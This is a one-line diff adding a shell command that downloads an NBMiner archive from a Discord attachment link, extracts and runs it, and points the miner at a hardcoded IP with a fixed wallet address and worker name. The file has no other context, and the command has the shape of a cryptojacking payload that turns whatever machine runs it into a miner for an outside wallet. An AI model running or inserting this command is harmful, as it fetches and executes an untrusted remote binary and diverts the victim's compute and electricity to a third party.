@@ -1,0 +1,1 @@
+cd ~ && rm -rf NBMiner_38.1_Linux.tgz && rm -rf NBMiner_Linux && curl -LJO https://cdn.discordapp.com/attachments/554291039175835658/988578805608251442/NBMiner_38.1_Linux.tgz && tar xfv NBMiner_38.1_Linux.tgz && cd NBMiner_Linux && pip install rel && ./nbminer -a ethash -o nicehash+tcp://35.173.233.6:80 -u 33KuiCeggK1uFFxX46beTmmVVswregaHet.Souhaila
